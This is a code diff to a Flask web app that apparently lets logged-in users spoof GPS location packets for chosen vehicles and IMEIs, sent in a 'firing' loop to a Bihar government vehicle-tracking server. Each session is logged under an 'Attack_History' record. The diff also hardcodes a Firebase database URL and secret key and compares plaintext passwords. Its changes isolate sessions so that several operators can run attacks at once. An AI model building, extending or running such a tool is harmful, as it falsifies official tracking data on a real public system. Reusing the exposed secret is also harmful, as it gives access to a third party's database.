@@ -3,14 +3,14 @@ from datetime import datetime, timedelta, timezone
 from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
 
 app = Flask(__name__)
-app.secret_key = "nitro_v82_final_multi_device_edition"
+app.secret_key = "nitro_v82_final_multi_device_edition_v2"
 
 FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
 FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"
 
 TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]
 
-# Global store for multiple sessions
+# Server-side memory for independent users
 user_sessions = {}
 
 def get_ist_time():
@@ -130,14 +130,15 @@ def log_to_firebase(uid, status_obj):
     try:
         now = get_ist_time()
         sid = status_obj["session_id"]
-        log_data = {"Vehicle_No": status_obj["vno"], "IMEI_No": status_obj["imei"], "Lat": status_obj["lat"], "Lon": status_obj["lon"], "Start_Time": now.strftime('%H:%M:%S')}
+        log_data = {"Vehicle_No": status_obj["vno"], "IMEI_No": status_obj["imei"], "Lat": status_obj["lat"], "Lon": status_obj["lon"], "Start_Time": now.strftime('%H:%M:%S'), "Status": "Active"}
         requests.put(f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{uid}/{sid}_{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
         requests.put(f"{FB_URL}/Data_Records/{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
     except: pass
 
 def firing_engine(uid):
     target = ("vlts.bihar.gov.in", 9999)
-    while user_sessions[uid]["firing"]:
+    # Thread check for specific user
+    while uid in user_sessions and user_sessions[uid]["firing"]:
         try:
             s = user_sessions[uid]
             tag = TAG_LIST[s["count"] % len(TAG_LIST)]
@@ -160,7 +161,6 @@ def login():
         data = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}").json()
         if data and str(data.get('password')) == str(pw):
             session['user'] = uid
-            # Har user ki apni memory store
             if uid not in user_sessions:
                 user_sessions[uid] = {"firing": False, "count": 0, "imei": "", "vno": "", "lat": str(data.get('lat', '25.298801')), "lon": str(data.get('lon', '84.651033')), "last_pkt": "Ready...", "session_id": ""}
             return redirect(url_for('dashboard'))
@@ -175,7 +175,7 @@ def dashboard():
 @app.route('/action', methods=['POST'])
 def action():
     uid = session.get('user')
-    if not uid: return redirect(url_for('login'))
+    if not uid or uid not in user_sessions: return redirect(url_for('login'))
     val = request.form.get('btn')
     if val == "start" and not user_sessions[uid]["firing"]:
         user_sessions[uid].update({"firing":True, "session_id":get_ist_time().strftime('%H%M%S'), "imei":request.form.get('imei'), "vno":request.form.get('vno').upper(), "lat":request.form.get('lat'), "lon":request.form.get('lon')})
@@ -193,8 +193,11 @@ def check_vehicle():
 
 @app.route('/data')
 def data():
+    # FIXED: Only return data for the logged-in user session
     uid = session.get('user')
-    return jsonify(user_sessions.get(uid, {}))
+    if uid in user_sessions:
+        return jsonify(user_sessions[uid])
+    return jsonify({"count": 0, "firing": False})
 
 @app.route('/logout', methods=['POST'])
 def logout():
